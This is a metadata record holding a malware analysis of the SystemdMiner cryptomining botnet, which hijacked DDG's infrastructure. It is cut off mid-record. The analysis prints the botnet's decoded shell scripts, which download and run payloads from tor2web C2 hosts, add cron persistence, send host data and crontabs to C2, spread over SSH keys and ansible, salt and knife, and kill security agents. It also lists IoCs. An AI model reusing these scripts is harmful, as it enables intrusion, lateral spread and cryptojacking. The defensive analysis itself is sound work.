{
    "id": "bae68812-f601-4384-be59-99a5a514b430",
    "created_at": "2023-01-12T15:00:24.475215Z",
    "updated_at": "2025-03-27T02:09:07.944307Z",
    "deleted_at": null,
    "sha1_hash": "98e5d391ba4a750d85b95f498f0cf381a7e86a65",
    "title": "2019-05-07 - SystemdMiner,when a botnet borrows another botnet’s infrastructure",
    "authors": "",
    "file_creation_date": "2022-05-28T03:34:41Z",
    "file_modification_date": "2022-05-28T03:34:41Z",
    "file_size": 910517,
    "plain_text": "# SystemdMiner,when a botnet borrows another botnet’s infrastructure\n\n**[blog.netlab.360.com/systemdminer-when-a-botnet-borrows-another-botnets-infrastructure/](https://blog.netlab.360.com/systemdminer-when-a-botnet-borrows-another-botnets-infrastructure/)**\n\nJiaYu May 7, 2019\n\n#### 7 May 2019 / Botnet\n\n## Update(2019.4.26 17:30)\n\n#### About 3 hours after the release of this article, we found that the attacker took down the URL of some Payload downloads, the following URL has expired:\n```\naptgetgxqs3secda.onion.ly/systemd-cron.sh\naptgetgxqs3secda.onion.pet/systemd-cron.sh\naptgetgxqs3secda.onion.ly/systemd-login-ddg\naptgetgxqs3secda.onion.pet/systemd-login-ddg\naptgetgxqs3secda.onion.ly/systemd-resolve\naptgetgxqs3secda.onion.pet/systemd-resolve\naptgetgxqs3secda.onion.ly/systemd.sh\naptgetgxqs3secda.onion.pet/systemd.sh\naptgetgxqs3secda.onion.ly/systemd-analyze\naptgetgxqs3secda.onion.pet/systemd-analyze\nrapid7cpfqnwxodo.onion.ly/systemd-login-h\nrapid7cpfqnwxodo.onion.pet/systemd-login-h\n\n## 1. Overview\n\n#### On Apr 11, we published a threat update on the DDG.Mining Botnet here with the following active C2:\n119.9.106.27  AS45187|RACKSPACE-AP Rackspace IT Hosting AS IT Hosting Provider Hong\nKong, HK|Hong Kong|China\n\n Then in the early morning of 2019.4.19, we found that DDG updated its configuration data and the malicious shell script i.sh from this C2. And at the end of the i.sh script, a new shell script section was added.\n\n The new shell script downloads a new set of malicious programs, interestingly, these new programs run independently from the DDG infrastructure. And it also kills the DDG process and clears out the DDG cron configuration.\n\n Shortly after these new malicious programs appear, the above-mentioned main DDG C2 went offline.\n\n We named this new botnet SystemdMiner, as multiple components of this malicious programs use systemd-<XXX> as their names\n\n```\n\n-----\n\n#### This botnet uses three means to spread itself, and after a successful compromise, a mining program based on XMRig will be downloaded for profit making.\n\n Although the above-mentioned main DDG C2 came offline, the DDG botnet did not die. Thanks to its P2P network structure and two standby C2s, the DDG botnet is still alive, with 3000+ active P2P Nodes per day.\n\n In the early morning of 4.25, DDG came back online with 2 new C2s and upgraded its version number to v4000. The configuration data version is CfgVer:25 . This latest update blocks the SystemdMiner’s C2 in the hosts file, and starts to use the following 2 new C2s:\n```\n109.237.25.145  AS63949|LINODE-AP Linode, LLC|United Kingdom|London --> Main C&C\n104.128.230.16  AS62217|VooServers_Ltd|United States|New York\n\n SystemdMiner is completely different from DDG in terms of C2 infrastructure, network structure, malicious code technical details, propagation methods, cryptomining machine programs, etc.:\n\n The DDG infrastructure consists of one primary C2 IP and two or three standby C2 IPs, while the SystemdMiner infrastructure is in dark network and make them accessible through services like tor2web (and cryptominging pool proxy IP) ; The current network structure of DDG is a hybrid structure--a combination of a set of C2 IPs and P2P network, and the network structure of SystemdMiner is a traditional C/S structure; The main sample of DDG is written in Go language. It has been the same since its birth. It runs with a malicious shell script i.sh. The main binary samples of SystemdMiner is written in C language. The implementation details and other details of the code are also completely different; DDG's current binary samples are all packed with standard UPX packer, while systemdMiner's binary samples packed with morphed UPX packer with no intuitive UPX features; The DDG is mainly spread by using SSH weak passwords and Redis unauthorized access vulnerabilities. SystemdMiner uses the following means;YARN's unauthorized access vulnerability;Use the *nix automated operation and maintenance tool (salt / ansible / chef-knife) for horizontal propagation;Propagating itself with the SSH key saved locally once it has access to a target host. DDG's cryptominer program was compiled directly from XMRig, without packed, and XMR Wallet was hard coded in the cryptominer program. The SysmtedMiner cryptominer program made significant changes to the XMRig source code, packed with a morphed UPX packer, and did not expose XMR Wallet.\n\n SystemdMiner’s main components:\n\n```\n\n-----\n\n#### systemd-login-ddg,ddgs.i686, ddgs.x86_64, systemd-login, systemd-login-h : these are the main samples, to set up tasks, horizontally propagate and download other samples and execute; cron.sh : to periodically download and execute the main samples; systemd.sh : to update the main sample and cryptominer program; systemd-resolve : exploit YARN unauthorize access vulnerabilities to spread itself horizontally; systemd-analyze : cryptominer program.\n\n The systemdMiner’s real C2 servers are set up in the dark network and are mapped to the public network through a set of services like tor2web.\n\n The following diagram shows dns requests trends for the C2 Domains of systemdMiner from our DNSMon:\n\n## 2. DDG's last config data and i.sh before v4000\n\n#### config data:\n\n\n-----\n\n```\n{CfgVer:23 Config:{Interval:60s} Miner:[{Exe:/tmp/6Tx3Wq\nMd5:42483ee317716f87687ddb79fedcb67b Url:/static/qW3xT.6} {Exe:/tmp/qW3xT.6\nMd5:42483ee317716f87687ddb79fedcb67b Url:/static/qW3xT.6}] Cmd:{AAredis:{Id:6071\nVersion:3022 ShellUrl:http://119.9.106.27:8000/i.sh Duration:240h NThreads:0\nIPDuration:6h GenLan:true GenAAA:false Timeout:1m Ports:[6379 6389 7379]} AAssh:\n{Id:2083 Version:3022 ShellUrl:http://119.9.106.27:8000/i.sh Duration:240h NThreads:0\nIPDuration:12h GenLan:true GenAAA:false Timeout:1m Ports:[22 1987]} Sh:[{Id:1\nVersion:-1 Line:uptime Timeout:5s} {Id:707 Version:3022 Line:rm -rf\n/root/.ssh/authorized_keys /root/.systemd-login Timeout:600s} {Id:701 Version:3022\nLine:crontab -r Timeout:600s} {Id:708 Version:3022 Line:echo -e \"\\n0.0.0.0\npastebin.com\\n0.0.0.0 thyrsi.com\\n0.0.0.0 tor2web.io\\n0.0.0.0 gitee.com\\n0.0.0.0\nw.21-3n.xyz\\n0.0.0.0 w.3ei.xyz\\n0.0.0.0 aptgetgxqs3secda.onion.ly\\n0.0.0.0\naptgetgxqs3secda.onion.pet\\n0.0.0.0 aptgetgxqs3secda.tor2web.fyi\\n0.0.0.0\naptgetgxqs3secda.onion.in.net\\n0.0.0.0 rapid7cpfqnwxodo.tor2web.fyi\\n0.0.0.0\nrapid7cpfqnwxodo.onion.in.net\\n0.0.0.0 rapid7cpfqnwxodo.onion.ly\\n0.0.0.0\nrapid7cpfqnwxodo.onion.pet\\n\" >> /etc/hosts Timeout:600s} {Id:709 Version:-1 Line:rm\n-f /tmp/systemd /tmp/.systemd-login /tmp/.systemd-analyze /lib/systemd/systemd-login\n~/.systemd-login Timeout:600s}] Killer:[{_msgpack:{} Id:606 Version:3020\nExpr:/tmp/ddgs.(3011|3012|3013|3014|3015|3016|3017|3018) Timeout:60s}] LKProc:[]}}\n\n#### And the last i.sh before ddg.v4000 :\n\n```\n\n-----\n\n```\nexport PATH $PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin\necho \"*/15 * * * * (curl -fsSL http://119.9.106.27:8000/i.sh||wget -q -Ohttp://119.9.106.27:8000/i.sh) | sh\" | crontab echo \"\" > /var/spool/cron/root\necho \"*/15 * * * * curl -fsSL http://119.9.106.27:8000/i.sh | sh\" >>\n/var/spool/cron/root\nmkdir -p /var/spool/cron/crontabs\necho \"\" > /var/spool/cron/crontabs/root\necho \"*/15 * * * * curl -fsSL http://119.9.106.27:8000/i.sh | sh\" >>\n/var/spool/cron/crontabs/root\ncd /tmp\ntouch /usr/local/bin/writeable && cd /usr/local/bin/\ntouch /usr/libexec/writeable && cd /usr/libexec/\ntouch /usr/bin/writeable && cd /usr/bin/\nrm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable\nexport PATH=$PATH:$(pwd)\nps auxf | grep -v grep | grep betsbce || rm -rf betsbce\nif [ ! -f \"betsbce\" ]; then\n  curl -fsSL http://119.9.106.27:8000/static/3022/ddgs.$(uname -m) -o betsbce\nfi\nchmod +x betsbce\n$(pwd)/betsbce || /usr/bin/betsbce || /usr/libexec/betsbce || /usr/local/bin/betsbce\n|| betsbce || ./betsbce || /tmp/betsbce\nps auxf | grep -v grep | grep betsbcb | awk '{print $2}' | xargs kill -9\nps auxf | grep -v grep | grep betsbcc | awk '{print $2}' | xargs kill -9\nps auxf | grep -v grep | grep betsbcd | awk '{print $2}' | xargs kill -9\necho\nZXhlYyAmPi9kZXYvbnVsbApzZWQgLWkgJy9yYXBpZC9kJyAvZXRjL2hvc3RzCnNlZCAtaSAnL2FwdGdlL2QnIC\n -d|bash\n\n#### Note the last Base64-encoded string in the i.sh script, which is decoded as a separate stand-alone shell script:\n\n```\n\n-----\n\n```\nexec &>/dev/null\nsed -i '/rapid/d' /etc/hosts\nsed -i '/aptge/d' /etc/hosts\nd() {\n  x=/systemd-login-ddg\n  y=/tmp/.systemd-login\n  wget -qU- --no-check-certificate $1$x -O$y || curl -fsSLkA- $1$x -o$y\n  chmod +x $y;$y\n  sleep 5\n}\nif ! ps -p $(cat /tmp/.X1M-unix); then\n  d aptgetgxqs3secda.onion.ly\nfi\nif ! ps -p $(cat /tmp/.X1M-unix); then\n  d aptgetgxqs3secda.onion.pet\nfi\nif ! ps -p $(cat /tmp/.X1M-unix); then\n  d aptgetgxqs3secda.tor2web.fyi || d aptgetgxqs3secda.onion.in.net\nfi\n\n#### This Shell script first checks the process ID in the /tmp/.X1M-unix, if the file does not exist or process is not running, it then attempts to download and run systemd-login-ddg through the following URLs :\naptgetgxqs3secda.onion.ly/systemd-login-ddg\naptgetgxqs3secda.onion.pet/systemd-login-ddg\naptgetgxqs3secda.tor2web.fyi/systemd-login-ddg\naptgetgxqs3secda.onion.in.net/systemd-login-ddg\n\n In addition, in the i.sh script, the DDG download files in the URL\nhxxp://119.9.106.27:8000/static/3022/ddgs.$(uname -m) is also replaced with the\n\n following SystemdMiner’s own programs. Thus, there are 3 SystemdMiner's malicious programs was downloaded to DDG's bot through this propagation:\n\n systemd-login-ddg ddgs.i686 ddgs.x86_64\n\n## 3. SystemdMiner sample analysis\n\n### 3.1 Systemd-login-ddg\n\n#### systemd-login-ddg is one of the core files, the other four ddgs.i686, ddsg.x86_64, system- login, system-login-h are systemd-login-ddg variants.\n\n```\n\n-----\n\n#### All binary samples related to SystemdMiner are compiled from musl-libc . And packed with deformed UPX, the Magic Number of the deformed UPX packer is 0x7373622E (ASCII String: .bss ) :\n\n After unpacking, all the binary malicious program checks LD_PRELOAD and PTRACE_TRACEME for anti-debugging and anti-sandboxing:\n\n Then, systemd-login-ddg deletes itself, creating the daemon process and writing the process ID into /tmp/.X1M-unix, the process name is -bash :\n\n\n-----\n\n#### Next, systemd-login-ddg writes the following script into the /tmp/systemd :\n```\n#!/bin/bash\nexec &>/dev/null\n{echo,ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Iv\n{base64,-d}|bash\n\n The Base64-encoded string in the above script is decoded as follows:\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nsleep $((RANDOM % 600))\n(wget -qU- -O- --no-check-certificate rapid7cpfqnwxodo.tor2web.fyi/cron.sh || curl fsSLkA- rapid7cpfqnwxodo.tor2web.fyi/cron.sh || wget -qU- -O- --no-check-certificate\nrapid7cpfqnwxodo.onion.in.net/cron.sh || curl -fsSLkArapid7cpfqnwxodo.onion.in.net/cron.sh )|bash\n\n If the current user is root, the sample will also check directory /lib/systemd/, and execute the command cp -f /tmp/systemd /lib/systemd/systemd-login so it gets executed when the system starts.\n\n Then, mv -f /tmp/systemd ~/.systemd-login, to move and hide the systemd file to the user's home directory.\n\n The script file used to boot and execute the above /lib/systemd/systemd-login downloads a cron.sh file from the C2 server.\n\n```\n\n-----\n\n#### cron.sh is a highly obfuscated shell script with the following contents:\n```\n\"${@%4}\"$'\\145v'${*%%5}al \"$(rK=(\\& \\ ${*,,} l H \\|${*//t5/&W} h n\"${@//ar}\" s\n\\+${*##\\(%} \\!${!*} M${*^^} \\. c 1${*##o} T 3\"${@~~}\" a${*~} w\"${@%9Q}\" g q \\-${*#uo}\n\\(${*,} \\=${*##+C} \\; O${*%JK} U\"${@~}\" 2$* \\<${*%%3} y \\} \\:${@//_o/F} u e\"${@}\" r\n\\/ L \\{ o i k S\"${@//Ao/W}\" m f${@/s\\`/\\]} v${@%0$} A $'\\xa'${*/Xr/>} \\$${*/&T} b\nt\"${@^^}\" P x \\) X p${*/u} d \\>)&&for JS in 32${*#mP} 50\"${@%%L}\" 32${*%%b} 12${@} 1\n0 55 34${@/~f/-\\\\} 54 32 43 34${*/^\\{/T} 6 31 2\"${@//s/x}\" 2${*,,} 45\"${@,,}\"\n32${*%E} 50 53${*//;\\]/O} 37 33 48 1 49${*~} 44 14 3 22 46 49 44 14\"${@,}\" 3 30 34\n47${@##+H} 38${*/j\\!} 6 30 34${*%Oe} 7 47 38 6${*/P\\}/\\)s} 30${@%%DG} 34\"${@%%J7}\"\n31$@ 7 33 34 47 38 6${*##Iq} 30 34${@} 31\"${@%Z}\" 7${*%G6} 33\"${@}\" 34 7${@^} 47 38\n6${@%h} 30 34 31${@##fO} 7${*##R} 33 34 2${*~} 37\"${@//q?}\" 12 16 2${@//K/EH} 34\n47${*//./_\\}} 38 6 30 34 31 7${*^} 33$* 34\"${@,}\" 2${*~~} 37\"${@/-/=}\" 12${*~~} 16 2\n34 7 47 38 6${*} 45 45 54 21 51$@ 1 36\"${@##qh}\" 45\"${@^}\" 1\"${@,,}\" 1${@/^z/o} 1 1\n50 22${*~~} 34\"${@##\\`}\" 7 28\"${@,}\" 7${@//L*/i} 48 32${*,} 41 54 20 2${@~~}\n37${*#DF} 18${@//CK/\\`\\\"} 38 6 45${*#A4} 1${*~~} 1 1${*//9S/d} 1 28\"${@~~}\" 22\n34${@^} 48${*^} 41${@^^} 53 34${*/Y\\}} 7 28 7 48${*##\\\"<} 32${*%v} 41${*#0m} 54\n45${*^^} 1 1 1 1 17 18 32 48\"${@^}\" 1 20${*/-G} 19 25 20 1 20\"${@}\" 20 6 37${*^^}\n20${*##C} 12${@,} 5${*//<Y} 32 12 39${@^^} 20${*%|} 12 32 33${*~~} 48 38 42${*^} 38\n12${@//#/ML} 16 48 32${*^} 1${@^^} 46 13${*~} 46 50${*/Rg} 1 20 24 46\"${@,,}\" 28 1 4\n4${*%g8} 1$@ 12\"${@%%%S}\" 31\"${@}\" 33\"${@##6^}\" 2 1 20 42 7${*~~} 40 35${!*} 39\n44${@//y} 20 1${*~~} 46 13 46 50${@%m} 1\"${@##Zk}\" 20\"${@//;O}\" 37 46 28 45${*%dG}\n1${*##>} 1 1${*^} 1 12 5${@%%?} 41 37${*~} 54 1 8${*,} 50${*,} 1\"${@%%V}\" 46${*%h6}\n28${*%h7} 23 46${*~} 28\"${@^^}\" 45 29${@//5/1} 45 45 38 42 1${*//z/\\(G} 9${@} 1 53 7\n1${*//NU/;*} 20 53${*//My/_y} 1 46 21 27${*/?h/Y6} 1 34 48 41${!@} 53 34 11\"${@//?\\\n(/9}\" 52\"${@//:3}\" 13${*~~} 10 20 31\"${@#o}\" 6${@#U} 38 50 51 23 1${*} 48${*##kx}\n5${*/_/zi} 32${*} 6 45${!@} 1${@~~} 1 1${*^^} 1 54 1 16$@ 53 48${*##6} 18${*//T/q} 32\n48\"${@/Tc/&F}\" 18${*/Y} 50 19 7${!@} 15${@^} 7 32${*~} 12 54 16 11${*%%&W}\n37${*//2/\\}#} 6${*//\\}^/F} 38 37 6${!@} 11 38${*,} 6${*,,} 11 6${*/NM/F} 32 48\n1\"${@##r}\" 4 4${*^^} 1${*#3} 54${@^^} 1\"${@}\" 16 53 48 18 32${@/\\}\\}} 48 18\"${@^}\"\n50\"${@^}\" 19${@##d%} 7${!@} 15 7\"${@}\" 32${*/ve} 12${!*} 54${@^} 16 11 37 6${*^^} 38\n37 6 11${*%s} 7 5 1 4\"${@%77}\" 4 1 54${@} 1${@/Rm} 16${!*} 53${*%36} 48${*^}\n18\"${@~}\" 32${*//,/P} 48 18 50${@##@} 19\"${@%b}\" 7 15 7 32${*^^} 12 54 16 11${*^^} 48\n37\"${@//Ca}\" 33\"${@~~}\" 26${*//5} 17 32${@//So} 47 11 42${*~} 28 38\"${@^^}\" 1 4\n4${*,} 1 54 1${@//k?} 16${@/\\\\} 53 48 18$@ 32${@#\\\\} 48 18${@/9} 50 19 7${*#\\`c} 15 7\n32 12${*^} 54${@%\\]} 16 11 48 37\"${@#V6}\" 33\"${@^^}\" 26${*%%T} 17${*^^} 32\n47${@/f7/p} 11${*#+H} 38${*,} 37${*%%wo} 45${*/<} 42 38 45\"${@~~}\";do\npr${*//<}i$'\\x6e'\\tf %s \"${rK[$JS]}\"\"${@/#}\";done;)\"\n\n The real content after de-obfuscation:\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nd() {\n  x=/systemd-login\n  y=/tmp/systemd\n  wget -qU- --no-check-certificate $1$x -O$y || curl -fsSLkA- $1$x -o$y\n  chmod +x $y;$y\n}\nif ! ps -p $(< /tmp/.X1M-unix); then\n  d aptgetgxqs3secda.onion.in.net || d aptgetgxqs3secda.onion.sh || d\naptgetgxqs3secda.tor2web.fyi || d aptgetgxqs3secda.tor2web.io\nfi\n\n```\n\n-----\n\n#### Finally, systemd-login-ddg continues to execute a series of Base64-encoded shell scripts.\n\n 3.1.1 Shell Script 1: Report to C2 and use automated operation and maintenance tools to spread\n\n The original script is Base64 encoded and decoded as follows:\n\n\n-----\n\n```\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nxssh() {\n  ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no oPubkeyAuthentication=yes -oStrictHostKeyChecking=no $1@$2 'echo\nZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2Jpbj\n -d|bash'\n}\ns1() {\n  x=/slave\n  y=($(whoami)_$(uname -m)_$(uname -n)_$(crontab -l|base64 -w0))\n  wget -qU- -O- --no-check-certificate --referer=$y $1$x || curl -fsSLkA- -e$y $1$x\n}\ns2() {\n  x=/systemd-resolve\n  y=/tmp/systemd-resolve\n  wget -qU- --no-check-certificate $1$x -O$y || curl -fsSLkA- $1$x -o$y\n  chmod +x $y;$y\n}\ns3() {\n  if [ -x $(command -v ansible) ]; then\n    ansible all -m shell -a 'echo\nZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2Jpbj\n -d|bash'\n  fi\n  if [ -x $(command -v salt) ]; then\n    salt '*' cmd.run 'echo\nZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2Jpbj\n -d|bash'\n  fi\n  if [ -x $(command -v knife) ]; then\n    knife ssh 'name:*' 'echo\nZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2Jpbj\n -d|bash'\n  fi\n  if [ -f $HOME/.ssh/id_rsa ] || [ -f $HOME/.ssh/id_dsa ] || [ -f\n$HOME/.ssh/id_ecdsa ] || [ -f $HOME/.ssh/id_ed25519 ]; then\n    hosts=$(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" ~/.bash_history /etc/hosts\n~/.ssh/known_hosts |awk -F: {'print $2'}|sort|uniq ;awk {'print $1'}\n$HOME/.ssh/known_hosts|sort|uniq|grep -v =|sort|uniq)\n    for h in $hosts;do xssh root $h; xssh $USER $h & done\n  fi\n}\ns1 rapid7cpfqnwxodo.tor2web.fyi\ns2 rapid7cpfqnwxodo.tor2web.fyi || s2 rapid7cpfqnwxodo.onion.in.net\ns3\n\n#### The script has three key functions, which are:\n\n```\n\n-----\n\n#### 1. S1() : Report compromised host information to\n```\n   rapid7cpfqnwxodo.tor2web.fyi/slave . To send back the current user name, CPU\n\n architecture, host name, and current user's cron table. After Base64 encoding, set these host information as the http-referer vaule and sent as an HTTP GET requests to C2; 2. S2() : Download the systemd-resolve file from C2 and execute it. System-resolve\n integrates the Exp of YARN's unauthorized access vulnerability; 3. S3() : Horizontal propagation using 3 *nix automated operation and maintenance tools\n (ansible/salt/chef-knife) and local SSH keys.\n\n 3.1.2 Shell Script 2: Setting up a cron task\n\n The shell script used for horizontal propagation is also Base64 encoded and decoded as follows:\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nc() {\n  if [ -x $(command -v crontab) ]; then\n    if [ $(crontab -l |grep REDIS00) ]; then\n      crontab -r\n    fi\n    if ((!EUID)); then\n      if [ ! -f \"/etc/cron.d/systemd\" ]; then\n        echo \"0 * * * * root /lib/systemd/systemd-login\" >\n/etc/cron.d/systemd\n      fi\n      if [ ! $(crontab -l |grep systemd-login) ]; then\n        (echo \"0 * * * * ~/.systemd-login\";crontab -l |sed '/wget/d'|sed\n'/curl/d')|crontab       fi\n    else\n      if [ ! $(crontab -l |grep systemd-login) ]; then\n        (echo \"0 * * * * ~/.systemd-login\";crontab -l |sed '/wget/d'|sed\n'/curl/d')|crontab       fi\n    fi\n  fi\n}\nc\n\n The main function of the script is to setup a new cron file /etc/cron.d/system to run\n/lib/systemd/systemd-login, the outcome of systemd-login-ddg. The wget and curl\n\n commands in the current user cron table are cleared to kill competitors' scheduled tasks.\n\n 3.1.3 Shell Script 3: Killing Competitors\n\n The original script is also Base64 encoded and decoded as follows:\n\n```\n\n-----\n\n```\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\npkill -9 -f \"8220|aegis_|AliYunDun|AliHids|AliYunDunUpdate|aliyunservice|cr.sh|cryptonight|ddgs|fs-manager|hashfish|hwlh3wlh44lh|javac|kerberods|kworkerds|kpsmouseds|kthrotlds|mewrs|miner|mr.sh|muhsti|mygit|orgfs|qW3xT|\nfind ~/.ddg/*|xargs fuser -k;rm -rf ~/.ddg\nfind /etc/cron*|xargs chattr -i\nfind /var/spool/cron*|xargs chattr -i\ngrep -RE \"(wget|curl)\" /etc/cron.*|cut -f 1 -d :|xargs rm -f\ngrep -RE \"(wget|curl)\" /var/spool/cron*|cut -f 1 -d :|xargs sed -i '/wget\\|curl/d'\nrm -f /usr/sbin/aliyun* /usr/local/aegis* /usr/local/qcloud* /usr/local/bin/dns\n~/.wget-hsts\n\n#### The function of this script is to remove various competitors.\n\n 3.1.4 Shell Script 4: Download and execute the cryptominer\n\n The original script is Base64 encoded and decoded as follows:\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nd() {\n  x=/systemd-analyze\n  y=/tmp/.systemd-analyze\n  wget -qU- --no-check-certificate $1$x -O$y || curl -fsSLkA- $1$x -o$y\n  chmod +x $y;$y\n  sleep 6\n}\nif ! ps -p $(cat /tmp/.X11-lock); then\n  d rapid7cpfqnwxodo.tor2web.fyi || d rapid7cpfqnwxodo.onion.in.net\nfi\n\n To download and execute system-analyze from rapid7cpfqnwxodo.tor2web.fyi or\nrapid7cpfqnwxodo.tor2web . systemd-analyze is a mining program based on XMRig.\n\n 3.1.5 Shell Script 5: Update Samples and Malicious Shell Scripts\n\n The original script is Base64 encoded and decoded as follows:\n\n```\n\n-----\n\n```\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nd() {\n  x=/systemd-login\n  y=/tmp/.systemd-login\n  wget -qU- --no-check-certificate $1$x -O$y || curl -fsSLkA- $1$x -o$y\n  chmod +x $y;$y\n  sleep 5\n}\nu() {\n  x=/systemd.sh\n  (wget -qU- -O- --no-check-certificate $1$x || curl -fsSLkA- $1$x)|bash\n}\nif [ -f /tmp/.systemd-update ]; then\n  kill -9 $(cat /tmp/.X1M-unix) && rm -f /tmp/.X1M-unix;rm -f /tmp/.systemd-update\n  d rapid7cpfqnwxodo.onion.in.net || d rapid7cpfqnwxodo.tor2web.fyi\nfi\nu rapid7cpfqnwxodo.onion.in.net || u rapid7cpfqnwxodo.tor2web.fyi\n\n#### systemd-login-ddg uses this script to check the sample update flag file /tmp/.systemdupdateand and download the latest systemd-login sample accordingly. The latest\n\n malicious shell script, systemd.sh is then downloaded and executed.\n\n Next, systemd-login-ddg executes the sixth shell script. The sixth shell script is basically the same as the fifth one, except that there is one more C2 Domain to download the systemd-login sample: rapid7cpfqnwxodo.tor2web.io .\n\n### 3.2 Systemd-resolve\n\n#### As mentioned earlier, systemd-resolve integrates YARN's unauthorized access vulnerability to spred to other hosts horizontally. It is very similar to systemd-login-ddg, except that its daemon is named -rbash .\n\n The sample is mainly used for internal network propagation targeting 172.16.0.0/12,\n192.168.0.0/16 and 10.0.0.0/8 . The sample first checks the LAN_IP of the current\n\n host, whether it belongs to the above three intranet segments:\n\n```\n\n-----\n\n#### If the current host's LAN_IP belongs to the above three network segments, the sample checks the 8088 ports of each host on the network:\n\n\n-----\n\n#### For the right target host, to use the following Payload to propagate itself:\n\n The shell script in Payload is also Base64 encoded and decoded as follows:\n```\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nd() {\n  x=/systemd-login-h\n  y=/tmp/systemd\n  wget -qU- --no-check-certificate $1$x -O$y || curl -fsSLkA- $1$x -o$y\n  chmod +x $y;$y\n}\nif ! ps -p $(< /tmp/.X1M-unix); then\n  d aptgetgxqs3secda.tor2web.fyi || d aptgetgxqs3secda.onion.in.net || d\naptgetgxqs3secda.onion.sh || d aptgetgxqs3secda.tor2web.io\nfi\n\n```\n\n-----\n\n#### We can see that systemd-login-h will be downloaded and executed. This systemd-login-h function is the same as the systemd-login-ddg analyzed above.\n\n### 3.3 Systemd.sh\n\n#### As mentioned earlier, systemd-login-ddg downloads systemd.sh and executes it in the fifth shell script. In the early days of our analysis of the SystemdMiner family, this systemd.sh script had no substantive content:\n```\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\n\n At around noon at 2019.4.23, the attacker officially put the systemd.sh online, the latest systemd.sh content:\nexec &>/dev/null\nexport PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\nd() {\n  x=/systemd-analyze\n  y=/tmp/.systemd-analyze\n  wget -qU- --no-check-certificate $1$x -O$y || curl -fsSLkA- $1$x -o$y\n  chmod +x $y;$y\n  sleep 6\n}\nif ! ps -p $(cat /tmp/.X11-lock); then\n  d rapid7cpfqnwxodo.d2web.org\nfi\n\n Thus its purpose is to download systemd-analyze and execute it.\n\n### 3.4 Systemd-analyze\n\n#### As mentioned above, SystemdMiner's current profit method is cryptomining, and the cryptominer program that ultimately undertakes this task is this systemd-analyze. The program also has the same methods of anti-analysis as SystemdMiner's other binaries, except that it names its own process as a 6-bytes random string of uppercase and lowercase letters and numbers. XMRig related string in the miner program:\n\n The cryptomining pool (Or Proxy) is under the attacker's own control. The mining account, password and Or Proxy used are as follows:\n\n```\n\n-----\n\n#### The corresponding IPs belongs to normal company or organization, most likey hacked hosts.\n\n DomainDNS Recorde TypeIPRemarkpol-ice.ruA5.167.55.128An Ice-cream firm in Ruassiaecosustain.infoA136.243.90.99A project from European Regional Development Fund\n\n## 4. IoCs\n\n#### Domains\n```\naptgetgxqs3secda.onion.ly\naptgetgxqs3secda.onion.pet\naptgetgxqs3secda.tor2web.fyi\naptgetgxqs3secda.onion.in.net\naptgetgxqs3secda.onion.mn\naptgetgxqs3secda.d2web.org\nrapid7cpfqnwxodo.tor2web.fyi\nrapid7cpfqnwxodo.onion.in.net\nrapid7cpfqnwxodo.onion.ly\nrapid7cpfqnwxodo.onion.pet\nrapid7cpfqnwxodo.onion.mn\nrapid7cpfqnwxodo.d2web.org\n\n Md5:\n64315b604bd7a4b2886bba0e6e5176be\ndd8202ac5e6a2f6c8638116aa09694d7\n45e4d4671efcd1d9e502359c2fbbd6eb\naa83345c8cc3e7b41709f96bfb9844f8\n9f3edaa64e912661cd03f1aa9d342162\naa83345c8cc3e7b41709f96bfb9844f8\n4215f6306caa3b216295334538cad257\n50da2fb3920bfedfeb9e3a58ca008779\nceaee3da774cc712dc735d38194b396e\n8d9f26cd8358dce9f44ee7d30a96793f\n4bff1a92e6adcfe48c8b0f42b21a5af6\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-07 - SystemdMiner,when a botnet borrows another botnet’s infrastructure.pdf"
    ],
    "report_names": [
        "2019-05-07 - SystemdMiner,when a botnet borrows another botnet’s infrastructure.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
